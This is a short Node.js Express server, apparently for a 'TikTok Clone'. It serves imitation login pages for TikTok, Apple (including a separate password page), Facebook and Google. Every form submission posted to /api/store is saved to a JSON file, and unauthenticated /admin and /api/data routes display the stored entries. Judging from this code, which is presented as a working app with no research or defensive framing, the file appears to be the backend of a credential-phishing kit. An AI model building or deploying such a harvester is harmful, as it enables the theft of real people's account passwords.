const express = require('express');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = 3000;
const DATA_FILE = path.join(__dirname, 'data.json');

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Serve all static files from the current directory
app.use(express.static(path.join(__dirname, 'public')));

// Route map — clean URLs
const routes = {
  '/':                  'login.html',
  '/login':             'login.html',
  '/signup':            'signup.html',
  '/login/phone':       'login-phone.html',
  '/login/email':       'login-email.html',
  '/signup/phone':      'signup-phone.html',
  '/signup/email':      'signup-email.html',
  '/auth/apple':        'apple-signin.html',
  '/auth/apple/verify': 'apple-password.html',
  '/auth/facebook':     'facebook-auth.html',
  '/auth/facebook/login': 'facebook-login.html',
  '/auth/google':       'google-signin.html',
};

Object.entries(routes).forEach(([route, file]) => {
  app.get(route, (req, res) => {
    res.sendFile(path.join(__dirname, 'public', file));
  });
});

// --- Admin ---
app.get('/admin', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

// --- API ---
app.post('/api/store', (req, res) => {
  const entry = { ...req.body, timestamp: new Date().toISOString() };
  let data = [];
  if (fs.existsSync(DATA_FILE)) {
    try { data = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8')); } catch (e) { data = []; }
  }
  data.push(entry);
  fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
  res.json({ success: true });
});

app.get('/api/data', (req, res) => {
  if (!fs.existsSync(DATA_FILE)) return res.json([]);
  try { res.json(JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'))); }
  catch (e) { res.json([]); }
});

app.get('/api/clear', (req, res) => {
  if (fs.existsSync(DATA_FILE)) fs.unlinkSync(DATA_FILE);
  res.json({ success: true });
});

// 404
app.use((req, res) => {
  res.redirect('/');
});

app.listen(PORT, () => {
  console.log(`\n  TikTok Clone running at http://localhost:${PORT}\n`);
  console.log('  Routes:');
  Object.entries(routes).forEach(([r, f]) => {
    console.log(`    http://localhost:${PORT}${r.padEnd(24)} → ${f}`);
  });
  console.log(`    http://localhost:${PORT}/admin                  → admin.html`);
  console.log('');
});
